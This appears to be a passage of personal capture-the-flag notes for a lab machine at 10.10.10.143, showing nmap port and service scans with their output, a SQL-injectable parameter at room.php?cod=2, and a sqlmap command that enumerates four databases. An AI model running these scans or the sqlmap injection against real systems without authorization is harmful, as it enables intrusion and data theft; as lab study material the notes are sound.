##### nmap

All port scan
```bash
sudo nmap -sV -p- -v 10.10.10.143 -oA nmap2
```
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Service scan
```bash
sudo nmap -sC -sV 10.10.10.143 -p 22,80,64999 -v -oA nmap
```
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

##### manual

- Navigated to http://10.10.10.143/room.php?cod=2 and it seems it is SQL injectable
- Grabbed the request header and saved it as `r.txt`
```bash
sqlmap -r r.txt --risk=3 --level=5 --dbs
```
![[Pasted image 20240903175847.png]]
Retrieved 4 databases